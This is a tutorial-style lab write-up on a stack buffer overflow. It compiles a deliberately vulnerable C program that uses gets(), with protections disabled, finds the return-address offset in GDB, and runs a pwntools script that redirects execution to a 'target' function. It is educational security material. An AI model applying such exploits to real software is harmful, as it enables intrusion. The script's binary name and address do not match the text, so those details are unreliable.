---
title: Buffer Overflow Vulnerability Experiment
toc: true
tags:
  - Reverse
  - Security
  - Linux
  - Buffer Overflow
  - exploit
aside: true
categories: Hands-On Practices
abbrlink: Buffer_Overflow_Test
date: 2020-03-11 21:09:15
description:
cover: /img/BOF.png
---

## Introduction

**Buffer Overflow Vulnerability** is one of the most common and severe security vulnerabilities in the field of software and system security. In the complex software systems of today's digital age, the threat from hackers or malicious users is ever-present. Buffer Overflow Vulnerability is one of the most concerning threats among them due to the significant threat it poses to computer systems.

In simple terms, a buffer overflow vulnerability occurs when code attempts to store data in a predefined size of memory block known as a **buffer**. If the amount of data input exceeds the maximum capacity of the buffer, the excess data will overflow into adjacent memory areas, potentially overwriting instructions or data that control program execution, leading to unexpected behavior.

The fundamental cause of buffer overflow vulnerabilities is negligence and errors in program design. When developers fail to handle user input correctly, especially when they do not perform sufficient validation and restrictions on the input, it may lead to such vulnerabilities. Attackers often exploit these unchecked inputs by sending specially crafted malicious data, triggering buffer overflow attacks. This attack method has been around for many years and has caused numerous serious security incidents throughout history.

In the past, several well-known buffer overflow vulnerabilities have been widely reported, some of which have had profound impacts on global information security. For example, the infamous `Code Red` and `Nimda` worms utilized buffer overflow vulnerabilities to rapidly infect tens of thousands of hosts. Similarly, the `Slammer` worm exploited a buffer overflow vulnerability in Microsoft SQL Server, causing a sudden surge in global internet traffic. These events emphasize the need for the entire tech industry to take buffer overflow vulnerabilities seriously.

> SQL Slammer - https://en.wikipedia.org/wiki/SQL_Slammer

So, this article aims to conduct a simple experiment on buffer overflow vulnerabilities to provide at least a conceptual understanding.

## Environment Setup

In terms of environment setup, we use the **Windows Subsystem for Linux (WSL)** platform to configure the development environment and use `Ubuntu 20.04 LTS` as the development environment. We will install the necessary tools in this environment, including `Python3`, `Pwntool`, and the `PEDA` plugin for GDB debugging.

WSL provides a feature to run Linux distributions on Windows systems, enabling us to perform Linux-related development work in a Windows environment. Ubuntu 20.04 LTS is a stable and common Linux distribution widely used in development and testing environments.

Before configuring the environment, we need to ensure that WSL is installed and running. Installation instructions for WSL can be found in the Microsoft official documentation or relevant online tutorials.
> https://learn.microsoft.com/zh-tw/windows/wsl/install

Next, we need to install Python3 and Pwntool in WSL. Pwntool is a common Python library used in CTFs, specifically designed for exploit development.

Before installing Pwntool, we need to make sure that git is installed in WSL. If not installed, it can be done using the following commands:

```shell
sudo apt update
sudo apt install git
```
Next, we can install `Pwntool` as follows:

```
sudo apt install python3 python3-pip
pip3 install --upgrade pip
pip3 install pwntools
```

Now we have completed the installation of Python3 and Pwntool in WSL.

Finally, we will configure the GDB DEBUG environment, using the PEDA plugin to assist us in practicing buffer overflow vulnerabilities.

```shell
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

Lastly, here is a simple C program `buffer_test.c` used as the target for demonstrating the buffer overflow vulnerability. The program includes a `uname()` function that uses the `gets()` function to receive user input, but it does not perform sufficient validation on the input, potentially leading to a buffer overflow vulnerability.


buffer_test.c
```c
#include <stdio.h>
void target(){
    printf("Oh No! Your Hacker.\n");
}
void uname(){
    char str[16];
    printf("input your name: \n");
    gets(str);
    printf("Hello, %s \n", str);
}
int main(){
    setvbuf(stdin, NULL, _IONBF, 0);  //Clear buffer
    setvbuf(stdout, NULL, _IONBF, 0);
    uname();
    return 0;
}
```

{% note info %}
The program contains the risky input function **gets**, used for practicing Buffer Overflow.
{% endnote %}

## Experimental Steps
### Compile the Program


First, we need to compile the code named `buffer_test.c` for further experimentation. During compilation, we need to disable the **Stack Canary** protection mechanism using the following command:

```shell
gcc buffer_test.c -o buffer_test -fno-stack-protector -no-pie
```

{% note info %}
`-fno-stack-protector` : Disable the Stack Canary protection mechanism.
{% endnote %}

## Check Protective Measures


Before starting the experiment, it is necessary to confirm the security protective measures of the target program. The `checksec` command can quickly check the relevant security measures of the target executable:

```shell
checksec buffer_test
```
![](https://i.imgur.com/HuO3k3R.png)


## Confirm the Target


Before launching an attack, we need to identify the target. In this experiment, our goal is to execute the `target` function, so we need to find the memory address of that function and overwrite the function's return address.
   

## Confirm Function Memory Address

Use GDB to query the memory address of the `target` function:

```shell
gdb buffer_test
gdb-peda$ disas target
```
![](https://i.imgur.com/l1S7BAX.png)

From the above image, the starting address of this function is `0x0000000000401196` . Knowing the address of the function, the next step is to understand how to overwrite the ret address from input.


## Testing

Before launching an actual attack, let's run the program in GDB and observe its behavior:

```shell
gdb-peta$ r    // Run it first
```
![](https://i.imgur.com/jdWT4BI.png)


The program will prompt the user to input a name, and after entering the name, it responds with `"Hello, {name}"`. Since the array in the original program that holds user input is only 16 bytes (`RBP ~ RBP-16`), **we can observe its behavior by inputting data exceeding 16 bytes**.


![Imgur](https://i.imgur.com/HOnCJiX.png)

As shown in the image, when input exceeds 24 bytes, a buffer overflow occurs, and a crash occurs after the **v** character. This indicates that we need at least 24 bytes of input to successfully overwrite the function's return address.

> So, it can be covered with 8 Bytes to overwrite the ret address.

> RBP shows only up to 'qrstuvwx', meaning it crashed when input reached 24 bytes.

## Actual Overwriting with Python

為了進行實際的攻擊，將使用 Python 撰寫攻擊腳本。這個腳本將使用 `Pwntools` 函式庫來進行攻擊，蓋過程式中的函式返回位址，使之執行 `target` 函式。

To carry out the actual attack, a Python script will be used to overwrite the program's function return address. This script will use the `Pwntools` library to perform the attack and execute the `target` function.

The attack script `attack.py` is as follows:

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
r = process('./demo')
r.recvuntil('input your name:') 
targer_address = p64(0x400667)
r.sendline(b'A' * 24 + targer_address)
r.interactive()
```



In the attack script, the `process()` function is used to execute the buffer_test program. Then, the `recvuntil()` function is used to wait for the program to display the prompt "input your name:", after which the pre-calculated address of the `target` function is added to the input data. Finally, the `interactive()` function is used to enter interactive mode to observe the results of the attack.

- `recvuntil()`: receive until, can receive a specific string, and execute the xx command when the target string is reached.
- `p8()`、`p32()`、`p64()`

   ![](https://i.imgur.com/HZzm1tq.png)

  - `p32`: pack data (32-bit integer) for data // u32: unpack
  - `p64`: pack data (64-bit integer) for data // u64: unpack

Convert to address

- `sendline(payload)`: send payload and newline
- `interactive()`： enter interactive mode, used to execute local or remote executables

## Execute the Attack Script

Finally, we run the attack script to perform the attack:
```shell
python3 attack.py
```
![](https://i.imgur.com/Hr1LHfQ.png)


After a successful attack, the program will execute the `target` function and display the message "Oh No! Your Hacker." This proves that we have successfully exploited the buffer overflow vulnerability.

{% note success %}
Successfully executed the target function!
{% endnote %}

{% note warning %}
Remember to ensure compliance with relevant laws and regulations when applying the knowledge gained in real-world environments, and only conduct security testing and exploitation in legally authorized situations.
{% endnote %}

## References
https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow